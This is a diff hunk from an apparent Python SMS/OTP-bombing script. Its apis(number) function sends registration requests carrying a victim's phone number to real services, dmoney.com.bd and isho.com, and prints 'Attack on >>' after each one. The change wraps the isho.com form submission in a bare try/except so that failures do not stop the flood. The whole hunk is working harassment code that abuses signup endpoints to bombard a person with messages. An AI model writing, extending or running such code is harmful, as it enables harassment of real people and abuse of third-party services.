@@ -93,14 +93,16 @@ def apis(number):
     json={"mobileNumber":number,"operatorId":"1","deviceName":"samsung SM-G965N Android 7.1.2","deviceNumber":f"9713aadd8{uuiDeviceRandom}","hardwareSignature":"544aed4fbc3ec3d4f7b55c1ded63f04a3c2dbbc8d5bad5f0d391e70aa7acf15f544b797f529fedfc62025053ba4e64ae639627a97cf24e049fe4307f7b9f01ae","mobileAppVersion":"3.0.6","mobileAppVersionCode":63,"productCode":"DM","requestId":"8414F7C27DFC5BBA","sessionStatusNeeded":0,"sessionToken":""}
     (requests.post("https://test.dmoney.com.bd:3035/DmoneyPlatform/um_customer_create_step_init",json=json,headers=headers).text)
     print(f"Attack on  >> "+number)
-
-    br = mechanize.Browser()
-    br.open("https://www.isho.com/register")
-    br.select_form(nr=1)
-    br.form["phone"]=number
-    br.form["email"]="ekramu@gmail.com"
-    gt=br.submit()
-    print(f"Attack on  >> "+number)
+    try:
+        br = mechanize.Browser()
+        br.open("https://www.isho.com/register")
+        br.select_form(nr=1)
+        br.form["phone"]=number
+        br.form["email"]="ekramu@gmail.com"
+        gt=br.submit()
+        print(f"Attack on  >> "+number)
+    except:
+        pass
 
     headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
     "Accept-Encoding":"gzip, deflate, br",
